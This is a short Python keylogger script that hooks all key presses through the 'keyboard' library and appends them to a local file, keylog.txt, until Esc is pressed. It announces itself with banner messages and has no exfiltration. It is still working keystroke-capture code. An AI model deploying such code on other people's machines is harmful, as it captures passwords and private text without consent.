import keyboard  
from datetime import datetime  

def save_to_file(keys):
    try:
        with open("keylog.txt", "a") as file:
            file.write(keys + "\n")  
    except Exception as e:
        print(f"Error saving to file: {e}")

def on_key_press(event):
    key = event.name  

    if key == "space":
        key = " "  
    elif key == "enter":
        key = "\n"  
    elif key == "decimal":
        key = "."  
    elif len(key) > 1:  
        key = f"[{key.upper()}]"  

    save_to_file(key)

def start_keylogger():
    print("Keylogger started. Press 'esc' to stop.")
    try:
        keyboard.on_press(on_key_press)
        keyboard.wait("esc")
    except Exception as e:
        print(f"Error starting keylogger: {e}")
    finally:
        print("Keylogger stopped.")

def display_welcome_message():
    print("----------------------------------------")
    print("Keylogger")
    print("----------------------------------------")
    print("This program logs keystrokes to a file.")
    print("Press 'esc' to stop the keylogger.")
    print("----------------------------------------")

def main():
    display_welcome_message()  
    start_keylogger() 

if __name__ == "__main__":
    main()